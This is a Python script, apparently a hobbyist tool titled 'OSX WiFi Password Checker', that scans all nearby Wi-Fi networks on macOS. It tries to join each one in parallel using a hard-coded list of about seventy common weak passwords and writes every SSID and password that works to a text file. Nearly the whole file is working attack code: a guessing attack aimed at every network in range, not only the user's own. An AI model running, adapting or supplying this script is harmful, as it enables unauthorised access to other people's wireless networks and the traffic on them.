import os
import subprocess
import sys
import time
import multiprocessing

# Function to print a rainbow ASCII banner
def print_rainbow_banner():
    colors = ["\033[1;31m", "\033[1;33m", "\033[1;32m", "\033[1;36m", "\033[1;34m", "\033[1;35m"]
    banner = [
        "▗▖ ▗▖▗▄▄▄▖▗▄▄▄▖▗▄▄▄▖    ▗▄▄▖ ▗▄▄▄▖",
        "▐▌ ▐▌  █  ▐▌     █      ▐▌ ▐▌▐▌   ",
        "▐▌ ▐▌  █  ▐▛▀▀▘  █      ▐▛▀▚▖▐▛▀▀▘",
        "▐▙█▟▌▗▄█▄▖▐▌   ▗▄█▄▖    ▐▙▄▞▘▐▌   ",
        " ",
        "OSX WiFi Password Checker",
        " "
    ]
    for line in banner:
        colored_line = "".join(colors[i % len(colors)] + char for i, char in enumerate(line))
        print(colored_line + "\033[0m")

# Function to attempt connecting to an SSID with multiple passwords
def try_passwords_for_ssid(worker_id, ssid, passwords, successful_combinations, status_dict):
    """Attempts to connect to an SSID using multiple passwords."""
    for password in passwords:
        status_dict[worker_id] = f"[🔄 Worker {worker_id}] {ssid} → Trying password: {password}"

        # Attempt connection
        command = ["networksetup", "-setairportnetwork", "en0", ssid, password]
        subprocess.run(command, capture_output=True, text=True)

        # Verify connection
        verify_command = ["networksetup", "-getairportnetwork", "en0"]
        verify_result = subprocess.run(verify_command, capture_output=True, text=True)

        if ssid in verify_result.stdout:
            status_dict[worker_id] = f"✅ [SUCCESS] {ssid} → Password: {password}"
            successful_combinations.append((ssid, password))
            return  # Stop checking passwords for this SSID

    status_dict[worker_id] = f"❌ [FAILED] No password worked for SSID: {ssid}"

if __name__ == "__main__":
    multiprocessing.freeze_support()  # Required for Windows, harmless on macOS

    print_rainbow_banner()  # Print only once

    # Passwords to try 
    passwords = [
    '88888888', 
    '12345678', 
    '1234567890', 
    '00000000', 
    '123123123', 
    'bnm,/852', 
    'buzhidao', 
    '123456aa',
    'wmsxie123',
    'aa123456',
    'wolf8637',
    'qq123456',
    'qq123123',
    '1qaz2wsx',
    'wpc000821',
    'sunliu66',
    '13e4e5sd',
    'qq666666',
    'q1w2e3r4',
    'zz123456',
    'a123456789',
    '112233abc',
    'g227w212',
    'woaini1314',
    'abc123456',
    'a1234567',
    'dircls128',
    '1q2w3e4r',
    'xiao801013',
    'aili1314',
    '123456789a',
    'qq111111',
    'yiyou2587',
    'xy123456',
    'a5201314',
    'zeng1013',
    'a42176488',
    '123456abc',
    'abcd1234',
    'wangyut2',
    '123456qq',
    'aa456789',
    'asd123456',
    '123456789k',
    'woaini123',
    'a25430071',
    '123aa123',
    'woaini520',
    'hd3080550',
    '789789aa',
    'zxc123456',
    'sxq330983',
    '0099466ok',
    'a12345678',
    'kuen4321',
    'qw123123',
    'wsw870815',
    'ad123456',
    'z19841130',
    'woaini521',
    '1234wswxw',
    'wy123456',
    'zhang123',
    'li222222',
    'qq369369',
    'qwe123456',
    'qqaa840605',
    'q1q1q1q1',
    'redredred'
    ]

    # Get available SSIDs
    scan_cmd = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | awk '{print $1}'"
    result = subprocess.run(scan_cmd, shell=True, capture_output=True, text=True)
    ssids = [ssid.strip() for ssid in result.stdout.split("\n")[1:] if ssid.strip()]

    if not ssids:
        print("❌ No WiFi networks found.")
        sys.exit(1)

    print(f"\n🔍 Found {len(ssids)} WiFi networks. Starting check...\n")

    # Multiprocessing manager for shared data
    manager = multiprocessing.Manager()
    successful_combinations = manager.list()
    status_dict = manager.dict()  # Shared status dictionary

    num_workers = min(len(ssids), multiprocessing.cpu_count())  # Limit workers to CPU count
    pool = multiprocessing.Pool(num_workers)

    # Start workers asynchronously
    for i, ssid in enumerate(ssids):
        status_dict[i] = f"[🔄 Worker {i}] Checking SSID: {ssid}"
        pool.apply_async(try_passwords_for_ssid, (i, ssid, passwords, successful_combinations, status_dict))

    # Monitor progress live
    while any("[🔄" in msg for msg in status_dict.values()):
        print("\033c", end="")  # Clear screen
        print_rainbow_banner()
        for msg in status_dict.values():
            print(msg)
        sys.stdout.flush()
        time.sleep(0.5)  # Adjust refresh rate

    # Close and join the pool
    pool.close()
    pool.join()

    # Print successful results
    print("\n✅ Summary: Successful SSID-Password Pairs:")
    if successful_combinations:
        for ssid, password in successful_combinations:
            print(f"- SSID: {ssid}, Password: {password}")
        with open("successful_combinations.txt", "w") as file:
            for ssid, password in successful_combinations:
                file.write(f"{ssid},{password}\n")
        print("\n💾 Saved successful combinations to successful_combinations.txt")
    else:
        print("❌ No successful connections.")

    print("\n🔄 Testing complete.")
